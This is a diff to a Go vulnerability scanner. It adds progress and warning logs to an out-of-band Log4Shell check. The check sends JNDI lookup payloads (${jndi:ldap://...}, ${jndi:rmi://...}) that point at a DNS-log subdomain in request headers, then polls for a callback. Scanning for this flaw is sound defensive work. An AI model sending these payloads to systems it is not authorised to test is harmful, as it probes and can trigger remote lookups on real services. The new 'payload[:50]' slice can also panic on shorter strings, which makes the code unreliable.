@@ -3,6 +3,7 @@ package cve
 import (
 	"context"
 	"fmt"
+	"log"
 	"math/rand"
 	"net/http"
 	"net/url"
@@ -289,6 +290,8 @@ func checkOOBLog4j(ctx context.Context, target *types.Target, endpoint *types.En
 	subdomain := generateDNSLogSubdomain()
 	fullDomain := subdomain + "." + dnslogDomain
 
+	log.Printf("[*] [OOB] Sending Log4j payloads to %s with DNS callback: %s", endpoint.URL, fullDomain)
+
 	log4jPayloads := []string{
 		fmt.Sprintf("${jndi:ldap://%s/a}", fullDomain),
 		fmt.Sprintf("${jndi:rmi://%s/a}", fullDomain),
@@ -304,22 +307,31 @@ func checkOOBLog4j(ctx context.Context, target *types.Target, endpoint *types.En
 			probeHeaders[h] = payload
 		}
 
-		_, err := client.Do(ctx, &scanner.Request{
+		resp, err := client.Do(ctx, &scanner.Request{
 			Method:  "GET",
 			URL:     endpoint.URL,
 			Headers: probeHeaders,
 		})
 		if err != nil {
+			log.Printf("[WARN] [OOB] Request failed: %v", err)
 			continue
 		}
+		_ = resp
+		log.Printf("[*] [OOB] Sent payload: %s", payload[:50]+"...")
 	}
 
 	// Wait for DNS propagation
+	log.Printf("[*] [OOB] Waiting 3s for DNS propagation...")
 	time.Sleep(3 * time.Second)
 
 	// Check if DNS log received
+	log.Printf("[*] [OOB] Checking DNS log for: %s", subdomain)
 	hit, err := checkDNSLog(dnslogDomain, target.DNSLogAPI, subdomain)
-	if err == nil && hit {
+	if err != nil {
+		log.Printf("[WARN] [OOB] DNS log check failed: %v", err)
+	}
+	if hit {
+		log.Printf("[!] [OOB] DNS callback CONFIRMED! Log4Shell vulnerability detected at %s", endpoint.URL)
 		findings = append(findings, types.Finding{
 			ID:          fmt.Sprintf("oob-log4j-%d", time.Now().UnixNano()),
 			PluginID:    "known-cve",
